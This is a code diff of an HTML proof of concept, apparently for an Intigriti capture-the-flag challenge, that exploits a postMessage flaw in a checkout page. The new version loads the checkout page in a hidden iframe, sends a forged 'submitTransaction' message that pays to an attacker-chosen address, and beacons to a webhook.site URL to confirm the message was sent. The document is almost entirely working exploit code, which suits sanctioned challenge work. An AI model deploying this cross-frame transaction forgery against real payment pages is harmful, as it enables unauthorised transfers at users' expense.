@@ -2,51 +2,43 @@
 <html>
 <body>
 <script>
+/*
+  Phase 1 – definitive transaction test
+  - No DOM access
+  - No UI simulation
+  - Only postMessage
+  - Long delay to ensure wallets are loaded
+*/
+
 const ADDRESS = "114a580aae95817f9bf8d3704eb6e69417";
 const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-const checkout = document.createElement("iframe");
-checkout.style.display = "none";
-checkout.src =
+// Load checkout page as admin
+const iframe = document.createElement("iframe");
+iframe.style.display = "none";
+iframe.src =
   "https://challenge-0126.intigriti.io/checkout.html" +
-  "?currency=1337COIN&price=1";
+  "?currency=1337COIN&price=1337";
 
-document.body.appendChild(checkout);
+document.body.appendChild(iframe);
 
-// Wait for checkout + wallets
+// Wait 60 seconds for full initialization
 setTimeout(() => {
-  // Trigger Proceed to Payment
-  checkout.contentWindow.document
-    .getElementById("proceedBtn")
-    .click();
-}, 5000);
-
-// Wait for payment-gateway iframe to load
-setTimeout(() => {
-  const paymentFrame =
-    checkout.contentWindow.document.getElementById("paymentIframe");
-
-  // Send init message (real flow)
-  paymentFrame.contentWindow.postMessage({
-    type: "init",
-    currency: "1337COIN",
-    amount: 1,
-    price: 1
+  // Send the vulnerable message
+  iframe.contentWindow.postMessage({
+    type: "submitTransaction",
+    transaction: {
+      toAddress: ADDRESS,
+      currency: "1337COIN",
+      amount: 1
+    }
   }, "*");
-}, 8000);
 
-// Trigger confirmPayment inside gateway
-setTimeout(() => {
-  const paymentFrame =
-    checkout.contentWindow.document.getElementById("paymentIframe");
-
-  paymentFrame.contentWindow.confirmPayment();
-
-  // Beacon
+  // Beacon for confirmation
   new Image().src =
-    WEBHOOK + "?step=confirm_clicked&addr=" + ADDRESS;
+    WEBHOOK + "?step=postmessage_sent&ts=" + Date.now();
 
-}, 11000);
+}, 60000);
 </script>
 </body>
 </html>
